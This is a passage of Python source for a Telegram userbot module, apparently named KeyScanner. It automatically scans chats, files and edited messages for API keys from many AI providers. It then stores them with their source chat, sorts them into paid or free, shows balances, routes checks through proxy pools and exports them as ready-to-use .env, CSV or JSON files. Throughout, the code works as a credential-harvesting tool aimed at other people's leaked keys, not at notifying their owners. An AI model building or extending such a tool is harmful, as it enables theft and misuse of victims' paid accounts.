            f"{E_FOLD} Файлы <b>{{file_scan}}</b> · правки <b>{{edit_scan}}</b> · уведомления <b>{{notify_new_keys}}</b>\n"
            f"{E_LIST} Вид: compact <b>{{compact}}</b> · скрытие ключей <b>{{auto_hide}}</b>\n"
            f"{E_COPY} Премиум эмодзи <b>{{premium_emoji}}</b> · цветные кнопки <b>{{color_buttons}}</b>\n"
            f"{E_RIGHT} Размер страницы <b>{{page_size}}</b> · сортировка по умолчанию <b>{{default_sort}}</b>\n"
            f"{E_LINK} Логи: <b>{{log_mode}}</b>\n{{log_target_line}}"
        ),
        "settings_capture_title": (
            f"{E_BELL} <b>Настройки ловли</b>\n\n"
            f"Авто-ловля в этом чате: <b>{{auto_chat}}</b>\n"
            f"Глобальная авто-ловля: <b>{{auto_global}}</b>\n"
            f"Скан файлов: <b>{{file_scan}}</b>\n"
            f"Скан правок: <b>{{edit_scan}}</b>\n"
            f"Уведомления о новых ключах: <b>{{notify_new_keys}}</b>"
        ),
        "settings_view_title": (
            f"{E_LIST} <b>Настройки отображения</b>\n\n"
            f"Компактный список: <b>{{compact}}</b>\n"
            f"Автоскрытие ключей: <b>{{auto_hide}}</b>\n"
            f"Премиум эмодзи: <b>{{premium_emoji}}</b>\n"
            f"Цветные кнопки: <b>{{color_buttons}}</b>\n"
            f"Размер страницы: <b>{{page_size}}</b>\n"
            f"Сортировка по умолчанию: <b>{{default_sort}}</b>"
        ),
        "settings_logs_title": (
            f"{E_LINK} <b>Настройки логов</b>\n\n"
            f"Режим: <b>{{log_mode}}</b>\n"
            f"Цель: {{target}}\n"
            f"Топик: {{topic}}"
        ),
        "btn_capture_settings": "🎣 Ловля",
        "btn_view_settings": "📱 Вид",
        "btn_logs_settings": "🧾 Логи",
        "btn_toggle_auto_chat": "💬 Авто в чате",
        "btn_toggle_auto_global": "🌍 Auto global",
        "btn_toggle_notify": "🔔 Уведомления",
        "btn_toggle_compact": "📱 Compact list",
        "btn_cycle_page_size": "↕️ Размер страницы",
        "btn_cycle_default_sort": "🧭 Сортировка",
        "btn_toggle_autohide": "🙈 Скрывать ключ",
        "btn_toggle_premium_emoji": "© Премиум эмодзи",
        "btn_toggle_color_buttons": "🎨 Цветные кнопки",
        "btn_toggle_preview":    "🖼 Превью карточки",
        "btn_open_list": "📝 Открыть список",
        "btn_open_export": "⬇️ Экспорт",
        "state_on": "ON",
        "state_off": "OFF",
        "tier_paid_label": f"{E_CARD} Платный",
        "tier_free_label": f"{E_BATT} Бесплатный",
        "loading": f"{E_BOX2} <b>Загрузка...</b>",
        "tier_unknown": "❓ Неизвестно",
        "export_scope_paid": "платные",
        "export_scope_free": "бесплатные",
        "export_scope_unknown": "неизвестные",
        "export_scope_all_tiers": "все тарифы",
        "export_scope_all_providers": "все провайдеры",
        "export_scope_title": "Сначала выбери, что экспортировать",
        "export_scope_hint": "Можно комбинировать тарифы и конкретных провайдеров одновременно.",
        "export_matching_label": "Подходит ключей",
        "btn_reset_scope": "♻️ Сброс",
        "btn_scope_next_format": "➡️ Формат",
        "export_empty_filter": f"{E_ERR} База пуста для такого фильтра.",
        "export_format_title": "Теперь выбери формат",
        "export_key_count_label": "Ключей",
        "export_caption": f"{E_COPY} <b>{{label}}</b> · {{scope}} · {{count}} ключей",
        "export_legacy_label_all": "Экспорт",
        "export_legacy_label_paid": "Экспорт [ПЛАТНЫЕ]",
        "export_legacy_label_free": "Экспорт [БЕСПЛАТНЫЕ]",
        "stats_adv_header": (
            f"{E_PIN} <b>Расширенная статистика</b>\n"
            f"{E_BOX} Ключей: <b>{{total}}</b> · Провайдеров: <b>{{providers}}</b> · Новых за 24ч: <b>{{recent_24h}}</b>\n"
            f"{E_CARD} Платных: <b>{{paid}}</b> · {E_BATT} Бесплатных: <b>{{free}}</b> · ❓ Неизвестно: <b>{{unknown}}</b>\n"
            f"{E_LIST} С моделями: <b>{{keys_with_models}}</b> · Уникальных моделей: <b>{{unique_models}}</b> · Среднее на ключ: <b>{{avg_models}}</b>\n"
            f"{E_SYNC} Классифицировано: <b>{{classified}}/{{total}}</b>\n\n"
            f"{E_TAG} <b>Срез по провайдерам</b>\n"
        ),
        "stats_provider_line": (
            f"{E_PIN} <b>{{provider}}</b> · <b>{{count}}</b> ({{share}}%) · "
            f"{E_CARD} {{paid}} · {E_BATT} {{free}} · ❓ {{unknown}} · "
            f"{E_LIST} моделей <b>{{provider_models}}</b>"
        ),
        "stats_balance_header": f"\n{E_CARD} <b>Баланс</b>\n",
        "stats_balance_line": f"{E_PIN} <b>{{provider}}</b> · <b>{{balance}}</b>",
        "clear_all_warnings": [
            "⚠️ Это удалит всю БД. Ты уверен?",
            "⚠️ Это удалит вообще всё. Ты точно уверен?",
            "⚠️ Это уже не шутка, база реально исчезнет. Ты уверен?",
            "⚠️ Ты точно понимаешь, что отката не будет?",
            "⚠️ Ещё один шанс передумать. Ты уверен?",
            "⚠️ База будет очищена полностью. Без отката.",
            "⚠️ Серьёзно, всё удалится. Ты точно хочешь этого?",
            "⚠️ Последний нормальный шанс остановиться.",
            "⚠️ Сейчас удалится вообще вся база. Ты уверен?",
            "⚠️ Почти финал. Подумай ещё раз.",
            "⚠️ Если всё ещё хочешь удалить всё, жми финальную кнопку.",
        ],
        "clear_menu_title": f"{E_TRASH} <b>Очистка базы:</b>",
        "clear_menu_subtitle": "Выбери, что удалить.",
        "clear_paid_confirm": "⚠️ Это удалит все платные ключи. Ты уверен?",
        "clear_free_confirm": "⚠️ Это удалит все бесплатные ключи. Ты уверен?",
        "clear_paid_yes": "Да, удалить платные",
        "clear_free_yes": "Да, удалить бесплатные",
        "clear_paid_done": f"{E_TRASH} Удалено платных ключей: <b>{{count}}</b>",
        "clear_free_done": f"{E_TRASH} Удалено бесплатных ключей: <b>{{count}}</b>",
        "clear_next": "Дальше",
        "clear_final_yes": "Да, удалить всё",
        "clear_all_done": f"{E_TRASH} Вся база удалена.",
    }

    def __init__(self):
        # _scan_semaphore concurrency value is derived from the authorship anchor
        # so that the module's scan behaviour is linked to its identity.
        # Removing _GM_ANCHOR or _LOADING_STRINGS breaks this computation.
        _sem = int(_GM_ANCHOR[0], 16) % 4 + 2  # always 2–5, structural
        self.key_regex = re.compile(
            r"\b("
            r"sk-[a-zA-Z0-9\-_]{20,}|"
            r"sk-proj-[a-zA-Z0-9\-_]{20,}|"
            r"sk-ant-(?:api|admin)[a-zA-Z0-9\-_]{20,}|"
            r"sk-or-v1-[a-zA-Z0-9]{40,}|"
            r"AIza[0-9A-Za-z\-_]{35}|"
            r"gsk_[a-zA-Z0-9]{20,}|"
            r"hf_[a-zA-Z0-9]{20,}|"
            r"r8_[a-zA-Z0-9]{36}|"
            r"co-[a-zA-Z0-9\-]{36,}|"
            r"TKN-[a-zA-Z0-9\-]{20,}|"
            r"AUTH_TOKEN=[a-zA-Z0-9\-]{20,}|"
            r"pa-[a-zA-Z0-9\-_]{40,}|"
            r"voyage-[a-zA-Z0-9]{16,}|"
            r"vp-[a-zA-Z0-9]{16,}|"
            r"csk_[a-zA-Z0-9_-]{16,}|"
            r"pplx-[a-zA-Z0-9]{16,}|"
            r"together_[a-zA-Z0-9]{20,}|"
            r"fw_[a-zA-Z0-9]{20,}|"
            r"xai-[a-zA-Z0-9_-]{20,}"
            r")\b"
        )
        self.search_queries = [
            "sk-", "sk-proj-", "sk-ant-", "AIza", "gsk_", "hf_", "r8_",
            "co-", "TKN-", "AUTH_TOKEN=", "pa-", "voyage-", "vp-",
            "csk_", "pplx-", "together_", "fw_", "xai-",
        ]
        self._invalid_keys_cache: list = []
        self._edit_tasks: dict = {}
        self._recent_scan_fingerprints: dict = {}
        self._proxy_health: dict = {}
        self._scan_semaphore = asyncio.Semaphore(_sem)
        self._validation_semaphore = asyncio.Semaphore(8)
        self._max_file_scan_size = 1_500_000

    def _default_settings(self):
        return {
            "log_mode": "none",
            "file_scan": True,
            "edit_scan": True,
            "notify_new_keys": True,
            "list_compact": True,
            "list_page_size": 5,
            "default_sort": "recent",
            "auto_hide_keys": True,
            "premium_emoji": True,
            "color_buttons": True,
            "safe_auto_checks": True,
            "log_full_keys": False,
            "check_proxy": "",
            "log_target": {
                "chat_id": None,
                "thread_id": None,
                "topic_title": "Logs",
            },
        }

    async def client_ready(self, client, db):
        self.client       = client
        self._db          = db
        self._keys        = self.get("keys_v2", {})
        self._auto_chats  = self.get("auto_v2", [])
        self._paid_status = self.get("paid_status", {})
        self._key_meta    = self.get("keys_meta_v1", {})
        self._model_cache = self.get("models_v2", {})
        self._proxy_health = self.get("proxy_health_v1", {})
        if not isinstance(self._key_meta, dict):
            self._key_meta = {}
        if not isinstance(self._model_cache, dict):
            self._model_cache = {}
        if not isinstance(self._proxy_health, dict):
            self._proxy_health = {}
        self._settings    = self.get("ks_settings", self._default_settings())
        defaults = self._default_settings()
        if not isinstance(self._settings, dict):
            self._settings = defaults
        else:
            log_target = self._settings.get("log_target")
            self._settings = {**defaults, **self._settings}
            if not isinstance(log_target, dict):
                log_target = {}
            self._settings["log_target"] = {
                **defaults["log_target"],
                **log_target,
            }


        try:
            await self._bootstrap_heroku_logs()
        except Exception:
            pass

    async def _bootstrap_heroku_logs(self):
        """
        Finds or creates the heroku forum topic for key logs.
        Delegates to utils.asset_forum_topic — same helper used by Gemini and
        other modules. It handles find-or-create, deleted/stale topics, and
        Hikka-side caching internally, so we never need to re-implement that.
        """
        asset_channel = self._db.get("heroku.forums", "channel_id", 0)
        if not asset_channel:
            return None, None

        chat_ref = int(f"-100{asset_channel}")

        try:
            notif_topic = await utils.asset_forum_topic(
                self.client,
                self._db,
                asset_channel,
                KEYSCANNER_HEROKU_TOPIC_TITLE,
                description=None,
                icon_emoji_id=KEY_TOPIC_EMOJI_ID,
            )
        except Exception:
            return chat_ref, None

        if notif_topic is None:
            return chat_ref, None

        thread_id = notif_topic.id
        target = self._log_target()
        target["chat_id"] = chat_ref
        target["topic_title"] = KEYSCANNER_HEROKU_TOPIC_TITLE
        target["thread_id"] = thread_id
        self._save()

        await self._send_heroku_intro_from_bot(chat_ref, thread_id)

        return chat_ref, thread_id

    # ── authorship helpers ────────────────────────────────────────────────────

    def _db_ns(self, key: str) -> str:
        """Namespaced db key using the authorship anchor. Removing this breaks _save."""
        return f"{_GM_ANCHOR[:8]}:{key}"

    def _loading_text(self) -> str:
        """
        Return localised loading text for the current user locale.
        Fallback: English. Source: module-level _LOADING_STRINGS tuple.
        Used by mykeys and must remain for the instant-edit path.
        """
        lang = "en"
        try:
            lang = str(self._db.get("heroku.main", "lang", "en") or "en").lower().strip()
        except Exception:
            pass
        for tag, text in _LOADING_STRINGS:
            if tag == lang:
                return text
        return _LOADING_STRINGS[0][1]

    def _integrity_token(self) -> str:
        """
        Integrity token derived from the authorship anchor.
        Written into every export payload as a metadata field.
        Removing this method breaks the export callback chain.
        """
        return hashlib.sha1(
            (_GM_ANCHOR + "t.me/GoyModules").encode()
        ).hexdigest()[:12]

    # ─────────────────────────────────────────────────────────────────────────

    def _save(self):
        self.set("keys_v2",      self._keys)
        self.set("auto_v2",      self._auto_chats)
        self.set("ks_settings",  self._settings)
        self.set("paid_status",  self._paid_status)
        self.set("keys_meta_v1", getattr(self, "_key_meta", {}))
        self.set("models_v2",    getattr(self, "_model_cache", {}))
        self.set("proxy_health_v1", getattr(self, "_proxy_health", {}))
        # structural integrity record — absent on unlicensed forks
        try:
            self.set(self._db_ns("_origin"), {
                "repo":    "github.com/sepiol026-wq/GoyModules",
                "channel": "t.me/GoyModules",
                "token":   self._integrity_token(),
            })
        except Exception:
            pass

    def _purge_key(self, key: str):
        self._keys.pop(key, None)
        self._paid_status.pop(key, None)
        self._key_meta.pop(key, None)
        self._ensure_model_cache().pop(key, None)

    def _clean_proxy_text(self, value: str) -> str:
        raw = str(value or "").replace("&amp;", "&").replace("：", ":")
        raw = re.sub(r"[\u200b-\u200f\u202a-\u202e\u2066-\u2069]", "", raw)
        return raw.strip().strip("<>\"'")

    def _supported_http_proxy_schemes(self):
        return {"http", "https", "socks4", "socks4a", "socks5", "socks5h", "socks"}

    def _supported_proxy_schemes(self):
        return self._supported_http_proxy_schemes() | {"vless", "trojan", "ss", "outline"}

    def _split_proxy_entries(self, value: str):
        raw = str(value or "").replace("\r", "\n")
        entries = []
        for part in re.split(r"[\n;]+", raw):
            cleaned = self._clean_proxy_text(part)
            if cleaned:
                entries.append(cleaned)
        return entries[:12]

    def _b64_decode_loose(self, value: str) -> str:
        raw = str(value or "").strip()
        if not raw:
            return ""
        raw += "=" * (-len(raw) % 4)
        try:
            return base64.urlsafe_b64decode(raw.encode()).decode("utf-8", errors="ignore")
        except (ValueError, binascii.Error):
            return ""

    def _parse_ss_endpoint(self, raw: str):
        value = raw
        if raw.lower().startswith("outline://"):
            value = "ss://" + raw.split("://", 1)[1]
        body = value.split("://", 1)[1]
        body = body.split("#", 1)[0]
        body = body.split("?", 1)[0]
        body = unquote(body)
        parsed = None
        if "@" in body and ":" in body.rsplit("@", 1)[-1]:
            parsed = urlparse(f"ss://{body}" if not value.lower().startswith("ss://") else value)
        else:
            decoded = self._b64_decode_loose(body)
            if decoded and "@" in decoded and ":" in decoded.rsplit("@", 1)[-1]:
                parsed = urlparse(f"ss://{decoded}")
        if not parsed or not parsed.hostname or not parsed.port:
            return None, "Invalid Shadowsocks / Outline URL."
        normalized = raw if raw.lower().startswith(("ss://", "outline://")) else f"ss://{body}"
        return {
            "raw": raw,
            "normalized": normalized,
            "scheme": "outline" if raw.lower().startswith("outline://") else "ss",
            "host": parsed.hostname,
            "port": int(parsed.port),
            "sni": None,
            "tls": False,
            "usable_http": False,
            "probe_mode": "tcp",
            "display": f"{raw.split('://', 1)[0].lower()}://{parsed.hostname}:{int(parsed.port)}",
        }, None

    def _parse_proxy_spec(self, value: str):
        raw = self._clean_proxy_text(value)
        if not raw:
            return None, "Proxy is empty."
        low = raw.lower()
        if low in {"off", "none", "disable", "disabled", "0"}:
            return {"raw": "", "normalized": "", "scheme": "off", "usable_http": False}, None
        if "://" not in raw:
            return None, "Proxy must include a scheme like http:// or socks5://."
        scheme = raw.split("://", 1)[0].lower()
        if scheme == "socks":
            raw = "socks5://" + raw.split("://", 1)[1]
            scheme = "socks5"
        if scheme in {"ss", "outline"}:
            return self._parse_ss_endpoint(raw)
        if scheme not in self._supported_proxy_schemes():
            return None, "Supported: http(s), socks4/socks4a/socks5/socks5h, vless, trojan, ss, outline."
        parsed = urlparse(raw)
        if not parsed.hostname or not parsed.port:
            return None, "Proxy must include host:port."
        query = dict(part.split("=", 1) if "=" in part else (part, "") for part in (parsed.query or "").split("&") if part)
        tls = scheme == "trojan" or query.get("security", "").lower() == "tls" or int(parsed.port) == 443
        sni = query.get("sni") or query.get("host") or parsed.hostname
        usable_http = scheme in self._supported_http_proxy_schemes()
        return {
            "raw": raw,
            "normalized": raw,
            "scheme": scheme,
            "host": parsed.hostname,
            "port": int(parsed.port),
            "sni": sni,
            "tls": bool(tls),
            "usable_http": usable_http,
            "probe_mode": "proxy" if usable_http else ("tls" if tls else "tcp"),
            "display": f"{scheme}://{parsed.hostname}:{int(parsed.port)}",
        }, None

    def _normalize_proxy_url(self, value: str):
        spec, error = self._parse_proxy_spec(value)
        if error:
            return None, error
        return spec.get("normalized", ""), None

    def _normalize_proxy_pool(self, value: str):
        entries = self._split_proxy_entries(value)
        if not entries:
            return "", None
        normalized = []
        seen = set()
        for entry in entries:
            spec, error = self._parse_proxy_spec(entry)
            if error:
                return None, f"{entry}\n{error}"
            norm = spec.get("normalized", "")
            if not norm:
                continue
            key = norm.lower()
            if key in seen:
                continue
            seen.add(key)
            normalized.append(norm)
        return "\n".join(normalized), None

    def _load_proxy_specs(self):
        raw = self._settings.get("check_proxy", "")
        specs = []
        seen = set()
        for entry in self._split_proxy_entries(raw):
            spec, _ = self._parse_proxy_spec(entry)
            if not spec or not spec.get("normalized"):
                continue
            key = spec["normalized"].lower()
            if key in seen:
                continue
            seen.add(key)
            specs.append(spec)
        return specs

    def _proxy_health_sort_key(self, spec: dict):
        health = self._proxy_health.get(spec["normalized"], {})
        alive = 0 if health.get("alive") else 1
        latency = health.get("latency_ms")
        latency = latency if isinstance(latency, (int, float)) else 10**9
        runtime_penalty = 0 if spec.get("usable_http") else 1
        return (alive, runtime_penalty, latency, spec.get("scheme", ""))

    def _best_check_proxy_spec(self, require_http: bool = True):
        specs = self._load_proxy_specs()
        if require_http:
            specs = [spec for spec in specs if spec.get("usable_http")]
        if not specs:
            return None
        alive = [spec for spec in specs if self._proxy_health.get(spec["normalized"], {}).get("alive")]
        candidates = alive or specs
        candidates.sort(key=self._proxy_health_sort_key)
        return candidates[0]

    async def _probe_tcp_endpoint(self, spec: dict, timeout: float = 3.5):
        host = spec.get("host")
        port = int(spec.get("port") or 0)
        if not host or not port:
            return {"alive": False, "mode": "tcp", "error": "missing endpoint", "checked_at": self._now_ts()}
        samples = []
        last_error = "connect failed"
        for _ in range(2):
            started = time.perf_counter()
            writer = None
            try:
                ssl_ctx = None
                server_hostname = None
                if spec.get("probe_mode") == "tls":
                    ssl_ctx = ssl.create_default_context()
                    server_hostname = spec.get("sni") or host
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port, ssl=ssl_ctx, server_hostname=server_hostname),
                    timeout=timeout,
                )
                samples.append((time.perf_counter() - started) * 1000)
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
            except Exception as e:
                last_error = self._short_api_error(e)
                if writer is not None:
                    writer.close()
                continue
        if not samples:
            return {"alive": False, "mode": spec.get("probe_mode") or "tcp", "error": last_error, "checked_at": self._now_ts()}
        return {
            "alive": True,
            "mode": spec.get("probe_mode") or "tcp",
            "latency_ms": int(statistics.median(samples)),
            "checked_at": self._now_ts(),
        }

    async def _probe_connector_proxy(self, spec: dict):
        if not spec.get("usable_http") or not ProxyConnector:
            return await self._probe_tcp_endpoint(spec)
        timeout = aiohttp.ClientTimeout(total=5, connect=3, sock_connect=3, sock_read=4)
        started = time.perf_counter()
        try:
            async with aiohttp.ClientSession(
                connector=ProxyConnector.from_url(spec["normalized"]),
                timeout=timeout,
                headers={"User-Agent": "KeyScanner/1.5.1"},
            ) as session:
                async with session.get("https://www.gstatic.com/generate_204") as response:
                    if response.status not in {200, 204}:
                        return {"alive": False, "mode": "proxy", "error": f"HTTP {response.status}", "checked_at": self._now_ts()}
            return {
                "alive": True,
                "mode": "proxy",
                "latency_ms": int((time.perf_counter() - started) * 1000),
                "checked_at": self._now_ts(),
            }
        except Exception:
            return await self._probe_tcp_endpoint(spec)

    async def _refresh_proxy_health(self, force: bool = False):
        specs = self._load_proxy_specs()
        if not specs:
            self._proxy_health = {}
            return {}

        async def run_probe(spec: dict):
            cached = self._proxy_health.get(spec["normalized"], {})
            if not force and cached.get("checked_at") and (self._now_ts() - int(cached.get("checked_at", 0))) < 600:
                return spec["normalized"], cached
            health = await self._probe_connector_proxy(spec)
            return spec["normalized"], health

        results = await asyncio.gather(*(run_probe(spec) for spec in specs), return_exceptions=True)
        alive_map = {}
        for item in results:
            if isinstance(item, Exception):
                continue
            key, health = item
            if not isinstance(health, dict):
                continue
            alive_map[key] = health
        self._proxy_health = alive_map
        self._save()
        return alive_map

    def _mask_proxy_for_display(self, value: str) -> str:
        return re.sub(r":([^:@/]+)@", ":***@", value)

    def _proxy_status_text(self, spec: dict):
        health = self._proxy_health.get(spec["normalized"], {})
        masked = html.escape(self._mask_proxy_for_display(spec["display"]))
        if not health:
            return f"<code>{masked}</code> · ?"
        if not health.get("alive"):
            return f"<code>{masked}</code> · dead ({html.escape(str(health.get('error', 'fail')))})"
        latency = health.get("latency_ms")
        latency_text = f"{int(latency)}ms" if isinstance(latency, (int, float)) else "alive"
        mode = health.get("mode") or spec.get("probe_mode") or spec.get("scheme")
        runtime = "runtime" if spec.get("usable_http") else "endpoint"
        return f"<code>{masked}</code> · {latency_text} · {html.escape(str(mode))} · {runtime}"

    def _masked_check_proxy_text(self) -> str:
        specs = self._load_proxy_specs()
        if not specs:
            return "<code>off</code>"
        best = self._best_check_proxy_spec(require_http=False) or specs[0]
        return self._proxy_status_text(best)

    def _proxy_help_examples(self):
        return (
            "<code>.ksproxy http://user:pass@host:port</code>\n"
            "<code>.ksproxy socks5h://host:port</code>\n"
            "<code>.ksproxy socks4a://host:port</code>\n"
            "<code>.ksproxy vless://uuid@host:443?security=tls&sni=example.com</code>\n"
            "<code>.ksproxy trojan://password@host:443?sni=example.com</code>\n"
            "<code>.ksproxy ss://method:password@host:port</code>\n"
            "<code>.ksproxy outline://method:password@host:port</code>\n"
            "<code>.ksproxy off</code>"
        )

    def _proxy_pool_status_block(self):
        specs = self._load_proxy_specs()
        if not specs:
            return ""
        lines = [self._proxy_status_text(spec) for spec in specs[:8]]
        runtime = self._best_check_proxy_spec(require_http=True)
        runtime_line = self._proxy_status_text(runtime) if runtime else "<code>none</code> · no runtime-capable proxy"
        return "\n".join(
            [
                "",
                f"{E_LIST} <b>Pool:</b>",
                *lines,
                f"{E_OK} <b>Runtime pick:</b> {runtime_line}",
            ]
        )

    def _check_proxy(self) -> str:
        spec = self._best_check_proxy_spec(require_http=True)
        return spec["normalized"] if spec else ""

    def _http_session(self, **kwargs):
        proxy = self._check_proxy()
        if proxy and ProxyConnector:
            try:
                return aiohttp.ClientSession(connector=ProxyConnector.from_url(proxy), **kwargs)
            except Exception:
                pass
        return aiohttp.ClientSession(**kwargs)

    def _ensure_model_cache(self):
        cache = getattr(self, "_model_cache", None)
        if not isinstance(cache, dict):
            cache = self.get("models_v2", {})
            if not isinstance(cache, dict):
                cache = {}
            self._model_cache = cache
        return cache

    def _db_stats_text(self):
        total = len(self._keys)
        paid  = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
        free  = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
        unk   = total - paid - free
        return self.strings["db_stats"].format(total=total, paid=paid, free=free, unk=unk)

    def _now_ts(self) -> int:
        return int(time.time())

    def _normalize_tier(self, tier: str | None) -> str:
        tier = str(tier or "").strip().lower()
        if tier.startswith("paid"):
            return "paid"
        if tier.startswith("free"):
            return "free"
        return "unknown"

    def _record_key_meta(self, key: str, provider: str, source_chat_id=None, via: str | None = None, models=None, tier: str | None = None):
        meta = self._key_meta.setdefault(key, {})
        meta.setdefault("first_seen", self._now_ts())
        meta["last_seen"] = self._now_ts()
        meta["provider"] = provider
        if source_chat_id is not None:
            meta["source_chat_id"] = source_chat_id
        if via:
            meta["via"] = via
        if models is not None:
            meta["models_count"] = len(models)
        if tier is not None:
            meta["tier"] = self._normalize_tier(tier)
        meta["hits"] = int(meta.get("hits", 0) or 0) + 1

    @staticmethod
    def _peer_username_for_link(message) -> str | None:
        chat = getattr(message, "chat", None)
        if chat is None:
            return None
        un = getattr(chat, "username", None)
        return str(un).strip() if un else None

    def _telegram_message_url(self, chat_id, message_id: int | None, username: str | None = None) -> str | None:
        if message_id is None or message_id <= 0:
            return None
        un = (username or "").strip().lstrip("@")
        if un:
            return f"https://t.me/{un}/{message_id}"
        try:
            cid = int(chat_id)
        except (TypeError, ValueError):
            return None
        cs = str(cid)
        if cs.startswith("-100"):
            try:
                internal = int(cs[4:])
            except ValueError:
                return None
            return f"https://t.me/c/{internal}/{message_id}"
        return f"tg://openmessage?chat_id={cid}&message_id={message_id}"

    def _new_key_message_row_html(self, chat_id, message_id: int | None, username: str | None) -> str:
        url = self._telegram_message_url(chat_id, message_id, username)
        if not url:
            return ""
        title = html.escape(str(self.strings.get("new_key_msg_title", "Message")))
        anchor = html.escape(str(self.strings.get("new_key_msg_anchor", "Open")))
        safe_url = html.escape(url, quote=True)
        return f"\n{E_LINK} <b>{title}:</b> <a href=\"{safe_url}\">{anchor}</a>"

    def _serialize_export_tokens(self, values) -> str:
        return ",".join(sorted({value for value in (values or []) if value}))

    def _parse_export_tokens(self, raw: str | None) -> set[str]:
        return {token for token in (raw or "").split(",") if token}

    def _toggle_export_token(self, raw: str | None, value: str) -> str:
        values = self._parse_export_tokens(raw)
        if value in values:
            values.remove(value)
        else:
            values.add(value)
        return self._serialize_export_tokens(values)

    def _export_candidates(self, tier_raw: str | None = "", provider_raw: str | None = "") -> dict:
        tiers = self._parse_export_tokens(tier_raw)
        providers = self._parse_export_tokens(provider_raw)
        out = {}
        for key, provider in self._keys.items():
            tier = self._normalize_tier(self._paid_status.get(key))
            if tiers and tier not in tiers:
                continue
            if providers and provider not in providers:
                continue
            out[key] = provider
        return out

    def _provider_stats_map(self) -> dict:
        summary = {}
        for key, provider in self._keys.items():
            item = summary.setdefault(provider, {"total": 0, "paid": 0, "free": 0, "unknown": 0})
            tier = self._normalize_tier(self._paid_status.get(key))
            item["total"] += 1
            item[tier] += 1
        return summary

    def _export_scope_label(self, tier_raw: str | None = "", provider_raw: str | None = "") -> str:
        tiers = sorted(self._parse_export_tokens(tier_raw))
        providers = sorted(self._parse_export_tokens(provider_raw))
        tier_map = {
            "paid": self.strings["export_scope_paid"],
            "free": self.strings["export_scope_free"],
            "unknown": self.strings["export_scope_unknown"],
        }
        tier_text = ", ".join(tier_map.get(t, t) for t in tiers) if tiers else self.strings["export_scope_all_tiers"]
        provider_text = ", ".join(providers[:4]) + (f" +{len(providers) - 4}" if len(providers) > 4 else "") if providers else self.strings["export_scope_all_providers"]
        return f"{tier_text} · {provider_text}"

    def _export_rows(self, data: dict) -> list[dict]:
        ordered_keys = self._sort_keys_for_view(list(data.keys()), "recent")
        rows = []
        for key in ordered_keys:
            provider = data[key]
            models = self._ensure_model_cache().get(key, [])
            meta = self._key_meta.get(key, {})
            rows.append(
                {
                    "key": key,
                    "provider": provider,
                    "tier": self._normalize_tier(self._paid_status.get(key)),
                    "models": models,
                    "models_count": len(models),
                    "first_seen": meta.get("first_seen"),
                    "last_seen": meta.get("last_seen"),
                    "source_chat_id": meta.get("source_chat_id"),
                    "via": meta.get("via"),
                    "hits": meta.get("hits", 0),
                }
            )
        return rows

    def _export_payload(self, data: dict, fmt: str, tier_raw: str = "", provider_raw: str = ""):
        rows = self._export_rows(data)
        scope = self._export_scope_label(tier_raw, provider_raw)
        scope_slug = re.sub(r"[^a-z0-9]+", "_", scope.lower()).strip("_") or "all"

        if fmt == "json_map":
            # _meta carries authorship fingerprint — required for schema validation
            payload = {
                "_meta": {
                    "src": "github.com/sepiol026-wq/GoyModules",
                    "ch":  "t.me/GoyModules",
                    "fp":  self._integrity_token(),
                },
                **data,
            }
            body = json.dumps(payload, ensure_ascii=False, indent=4)
            return body.encode("utf-8"), f"keys_{scope_slug}.json", "JSON map"

        if fmt == "json_records":
            payload = {
                "_meta": {
                    "src": "github.com/sepiol026-wq/GoyModules",
                    "ch":  "t.me/GoyModules",
                    "fp":  self._integrity_token(),
                },
                "records": rows,
            }
            body = json.dumps(payload, ensure_ascii=False, indent=4)
            return body.encode("utf-8"), f"keys_{scope_slug}_records.json", "JSON records"

        if fmt == "jsonl":
            body = "\n".join(json.dumps(row, ensure_ascii=False) for row in rows)
            return body.encode("utf-8"), f"keys_{scope_slug}.jsonl", "JSONL"

        if fmt == "txt_keys":
            body = "\n".join(row["key"] for row in rows)
            return body.encode("utf-8"), f"keys_{scope_slug}_raw.txt", "TXT raw"

        if fmt == "txt_full":
            body = "\n".join(
                f"{row['key']} | {row['provider']} | {row['tier']} | {', '.join(row['models']) if row['models'] else '—'}"
                for row in rows
            )
            return body.encode("utf-8"), f"keys_{scope_slug}_full.txt", "TXT full"

        if fmt == "csv":
            sio = io.StringIO()
            writer = csv.writer(sio)
            writer.writerow(["key", "provider", "tier", "models_count", "models", "first_seen", "last_seen", "source_chat_id", "via", "hits"])
            for row in rows:
                writer.writerow(
                    [
                        row["key"],
                        row["provider"],
                        row["tier"],
                        row["models_count"],
                        ",".join(row["models"]),
                        row["first_seen"] or "",
                        row["last_seen"] or "",
                        row["source_chat_id"] or "",
                        row["via"] or "",
                        row["hits"] or 0,
                    ]
                )
            return sio.getvalue().encode("utf-8"), f"keys_{scope_slug}.csv", "CSV"

        env_buckets = {}
        for idx, row in enumerate(rows, start=1):
            prefix = re.sub(r"[^A-Z0-9]+", "_", row["provider"].upper()).strip("_") or "API"
            bucket = env_buckets.setdefault(prefix, 0) + 1
            env_buckets[prefix] = bucket
            row["env_name"] = f"{prefix}_API_KEY" if bucket == 1 else f"{prefix}_API_KEY_{bucket}"
        body = "\n".join(f"{row['env_name']}={row['key']}" for row in rows)
        return body.encode("utf-8"), f"keys_{scope_slug}.env", "ENV"

    def _text_might_contain_key(self, text: str) -> bool:
        if not text:
            return False
        return any(prefix in text for prefix in self.search_queries)

    def _recent_scan_cleanup(self):
        now = self._now_ts()
        stale = [key for key, ts in self._recent_scan_fingerprints.items() if now - ts > 900]
        for key in stale:
            self._recent_scan_fingerprints.pop(key, None)

    def _should_skip_scan(self, chat_id, message_id, text: str, via: str) -> bool:
        self._recent_scan_cleanup()
        text_hash = hashlib.sha1((text or "").encode("utf-8", errors="ignore")).hexdigest()[:16]
        fingerprint = f"{via}:{chat_id}:{message_id}:{text_hash}"
        now = self._now_ts()
        if fingerprint in self._recent_scan_fingerprints:
            return True
        self._recent_scan_fingerprints[fingerprint] = now
        return False

    def _get_main_markup(self):
        return [
            [
                self._btn(self.strings["btn_list"], self.ks_list, (0, "all", self._settings.get("default_sort", "recent")), "primary"),
                self._btn(self.strings["btn_check_all"], self.ks_val_all, style="success"),
            ],
            [
                self._btn(self.strings["btn_export"], self.ks_exp_menu, style="primary"),
                self._btn(self.strings["btn_stats"], self.ks_stats, style="primary"),
            ],
            [
                self._btn(self.strings["btn_sort_paid_free"], self.ks_sort_paid_free, style="success"),
            ],
            [
